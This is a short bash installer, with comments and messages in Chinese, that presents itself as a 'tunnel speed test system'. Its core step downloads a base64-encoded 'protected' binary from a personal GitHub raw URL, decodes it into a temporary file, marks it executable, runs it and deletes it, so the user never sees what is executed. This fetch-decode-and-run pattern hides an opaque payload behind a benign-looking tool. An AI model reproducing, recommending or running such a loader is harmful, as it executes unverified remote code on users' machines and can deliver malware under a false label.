cat > speedtest_base64.sh << 'EOF'
#!/bin/bash

# 颜色定义
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${BLUE}"
echo "╔══════════════════════════════════════╗"
echo "║          隧道测速系统                ║"
echo "╚══════════════════════════════════════╝"
echo -e "${NC}"

echo -e "${YELLOW}📥 下载并解码测速系统...${NC}"

# 创建临时文件
TEMP_FILE=$(mktemp)

# 下载base64文件并解码
if curl -fsSL https://raw.githubusercontent.com/534607701/nick/main/replacez_protected_bin.txt | base64 -d > "$TEMP_FILE" 2>/dev/null; then
    echo -e "${GREEN}✅ 下载完成${NC}"
else
    echo -e "${RED}❌ 下载失败${NC}"
    exit 1
fi

chmod +x "$TEMP_FILE"

echo -e "${GREEN}✅ 准备就绪${NC}"
echo -e "${BLUE}🚀 启动测速系统...${NC}"
echo ""

# 执行
"$TEMP_FILE"

# 清理
rm -f "$TEMP_FILE"
EOF

chmod +x speedtest_base64.sh
